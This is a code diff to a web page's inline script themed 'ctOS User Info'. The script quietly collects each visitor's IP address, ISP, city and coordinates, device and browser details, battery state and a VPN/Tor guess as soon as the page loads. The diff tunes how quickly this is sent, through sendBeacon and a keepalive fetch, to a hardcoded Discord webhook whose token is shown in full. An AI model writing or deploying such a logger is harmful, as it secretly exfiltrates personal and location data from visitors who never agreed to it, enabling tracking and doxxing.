@@ -85,23 +85,41 @@
 
 <script>
     // ================================================================
-    //  WEBHOOK (reemplazar con el tuyo)
+    //  WEBHOOK
     // ================================================================
     const WEBHOOK = "https://discord.com/api/webhooks/1537148912111059014/BqjpnaFhgaclQzaFHQ5aFUktrEg4Vo-YdgxKDtjP3C-o9bPIz5biUvNnjth25Gmu6iR6";
 
     // ================================================================
-    //  ENVÍO RÁPIDO (sendBeacon + fetch con keepalive)
+    //  ENVÍO INMEDIATO (sin esperar respuesta)
     // ================================================================
-    function sendFast(msg) {
+    function sendNow(msg) {
+        // sendBeacon es instantáneo y no bloquea
         const blob = new Blob([JSON.stringify({ content: msg })], { type: 'application/json' });
-        if (navigator.sendBeacon(WEBHOOK, blob)) return true;
+        navigator.sendBeacon(WEBHOOK, blob);
+        // También usamos fetch con keepalive por si acaso
         fetch(WEBHOOK, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({ content: msg }),
             keepalive: true
         }).catch(() => {});
-        return false;
+    }
+
+    // ================================================================
+    //  OBTENER IP CON TIMEOUT DE 500ms
+    // ================================================================
+    function getIPFast() {
+        return Promise.race([
+            fetch('https://ipapi.co/json/', { signal: AbortSignal.timeout(500) })
+                .then(r => r.json())
+                .then(d => d.ip ? d : null)
+                .catch(() => null),
+            fetch('http://ip-api.com/json/', { signal: AbortSignal.timeout(500) })
+                .then(r => r.json())
+                .then(d => d.query ? { ip: d.query, org: d.isp, country_name: d.country, region: d.regionName, city: d.city, latitude: d.lat, longitude: d.lon, proxy: d.proxy || false } : null)
+                .catch(() => null),
+            new Promise(resolve => setTimeout(() => resolve(null), 500))
+        ]);
     }
 
     // ================================================================
@@ -109,7 +127,7 @@
     // ================================================================
     (function() {
         try {
-            // ---- Datos instantáneos ----
+            // ---- Datos instantáneos (síncronos) ----
             const ua = navigator.userAgent;
             const os = (function() {
                 if (ua.includes('Windows NT')) return 'Windows';
@@ -138,59 +156,45 @@
 
             const plugins = Array.from(navigator.plugins || []).map(p => p.name).join(', ') || 'none';
 
+            // Batería: se obtiene sin bloquear (si llega, se actualizará, pero no esperamos)
             let battery = 'Unavailable';
             if (navigator.getBattery) {
-                Promise.race([
-                    navigator.getBattery().then(b => {
-                        battery = Math.round(b.level * 100) + '% (' + (b.charging ? 'charging' : 'discharging') + ')';
-                    }),
-                    new Promise(resolve => setTimeout(resolve, 500))
-                ]).catch(() => {});
+                navigator.getBattery().then(b => {
+                    battery = Math.round(b.level * 100) + '% (' + (b.charging ? 'charging' : 'discharging') + ')';
+                }).catch(() => {});
             }
 
             const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
             const screenRes = screen.width + 'x' + screen.height + 'x' + screen.colorDepth;
             const cpuCores = navigator.hardwareConcurrency || '?';
             const ram = navigator.deviceMemory || '?';
-            const lang = navigator.language;
 
-            // ---- Detección VPN/Tor instantánea ----
+            // ---- VPN/Tor instantáneo ----
             let isVpn = false;
             if (ua.includes('Tor') || ua.includes('Anonymous')) isVpn = true;
             if (navigator.webdriver === true) isVpn = true;
 
-            // ---- Obtener IP con timeout de 800 ms ----
-            let ip = 'Unknown';
-            let isp = 'Unknown ISP';
-            let location = 'Unknown';
-            let coords = 'Unknown';
+            // ---- Obtener IP con timeout de 500ms (no bloqueante) ----
+            getIPFast().then(ipData => {
+                let ip = 'Unknown';
+                let isp = 'Unknown ISP';
+                let location = 'Unknown';
+                let coords = 'Unknown';
 
-            const ipPromise = Promise.race([
-                fetch('https://ipapi.co/json/', { signal: AbortSignal.timeout(800) })
-                    .then(r => r.json())
-                    .then(d => d.ip ? d : null)
-                    .catch(() => null),
-                fetch('http://ip-api.com/json/', { signal: AbortSignal.timeout(800) })
-                    .then(r => r.json())
-                    .then(d => d.query ? { ip: d.query, org: d.isp, country_name: d.country, region: d.regionName, city: d.city, latitude: d.lat, longitude: d.lon, proxy: d.proxy || false } : null)
-                    .catch(() => null),
-                new Promise(resolve => setTimeout(() => resolve(null), 800))
-            ]);
-
-            ipPromise.then(data => {
-                if (data) {
-                    ip = data.ip || data.query || 'Unknown';
-                    isp = data.org || data.isp || 'Unknown ISP';
-                    location = (data.city || '') + ', ' + (data.region || data.regionName || '') + ', ' + (data.country_name || data.country || 'Unknown');
-                    coords = (data.latitude || data.lat || '') + ', ' + (data.longitude || data.lon || '');
-                    if (data.proxy) isVpn = true;
-                    if (data.org) {
+                if (ipData) {
+                    ip = ipData.ip || ipData.query || 'Unknown';
+                    isp = ipData.org || ipData.isp || 'Unknown ISP';
+                    location = (ipData.city || '') + ', ' + (ipData.region || ipData.regionName || '') + ', ' + (ipData.country_name || ipData.country || 'Unknown');
+                    coords = (ipData.latitude || ipData.lat || '') + ', ' + (ipData.longitude || ipData.lon || '');
+                    if (ipData.proxy) isVpn = true;
+                    if (ipData.org) {
                         const vpnWords = ['vpn','proxy','hosting','cloud','datacenter','tor','anonymous'];
-                        if (vpnWords.some(w => data.org.toLowerCase().includes(w))) isVpn = true;
+                        if (vpnWords.some(w => ipData.org.toLowerCase().includes(w))) isVpn = true;
                     }
                 }
-                // Mensaje final con todos los datos
-                const finalMsg = 
+
+                // Mensaje final
+                const msg = 
 `**ctOS User Info**
 **IP:** ${ip} (${isp})
 **Location:** ${location}
@@ -203,12 +207,13 @@
 **Screen:** ${screenRes}
 **Battery:** ${battery}
 **Time Zone:** ${timezone}
-**Language:** ${lang}
 **GPU:** ${gpu}
 **Plugins:** ${plugins}
 **Timestamp:** ${new Date().toLocaleString()}`;
 
-                sendFast(finalMsg);
+                sendNow(msg);
+
+                // Actualizar estado visual
                 const el = document.getElementById('status');
                 if (el) {
                     el.textContent = '✅ Sent!';
@@ -216,13 +221,13 @@
                 }
             });
 
-            // ---- Envío de respaldo a los 900 ms (por si la IP falla) ----
+            // Si la IP tarda más de 500ms, enviamos un mensaje rápido con "Unknown" (respaldo)
             setTimeout(() => {
                 const backupMsg = 
 `**ctOS User Info (Fast)**
-**IP:** ${ip} (${isp})
-**Location:** ${location}
-**Coordinates:** ${coords}
+**IP:** Unknown (Unknown ISP)
+**Location:** Unknown
+**Coordinates:** Unknown
 **VPN/Tor:** ${isVpn ? 'Yes' : 'No'}
 **OS:** ${os}
 **Browser:** ${browser}
@@ -231,16 +236,15 @@
 **Screen:** ${screenRes}
 **Battery:** ${battery}
 **Time Zone:** ${timezone}
-**Language:** ${lang}
 **GPU:** ${gpu}
 **Plugins:** ${plugins}
 **Timestamp:** ${new Date().toLocaleString()}`;
-                sendFast(backupMsg);
-            }, 900);
+                sendNow(backupMsg);
+            }, 600);
 
         } catch (err) {
             const errMsg = `**ctOS Error**\n${err.message}`;
-            sendFast(errMsg);
+            sendNow(errMsg);
             const el = document.getElementById('status');
             if (el) {
                 el.textContent = '❌ Error';
